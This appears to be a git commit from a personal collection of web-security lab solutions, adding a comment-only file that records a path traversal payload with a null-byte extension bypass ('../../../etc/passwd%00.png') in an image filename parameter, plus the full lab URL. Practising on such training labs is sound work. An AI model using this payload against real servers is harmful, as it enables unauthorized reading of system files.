cfb67a10f2ac6abfc256ecb88b57da94743701de
Pranjal <pranjalruhela2811@gmail.com>
2023-07-08 11:10:56 +0530

    null byte

---
+++ FilePathTraversal/validation of file extension with null byte bypass/payload.js
@@ -0,0 +1,11 @@
+/*
+
+GET /image?filename=51.jpg 
+../../../etc/passwd%00.png
+
+
+https://0a88002b03ccd0d080b88a06006f0079.web-security-academy.net/image?filename=../../../etc/passwd%00.png
+
+
+
+*/
